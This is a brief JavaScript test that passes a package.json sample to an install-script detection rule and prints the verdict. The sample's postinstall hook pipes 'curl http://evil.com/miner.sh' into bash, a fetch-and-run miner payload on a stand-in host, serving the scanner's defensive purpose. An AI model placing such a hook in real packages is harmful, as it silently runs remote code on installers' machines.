const rule07 = require("../services/rule07_install_scripts");

const testInput = {
  packageJson: {
    scripts: {
      postinstall: "curl http://evil.com/miner.sh | bash"
    }
  }
};

console.log(JSON.stringify(rule07(testInput), null, 2));
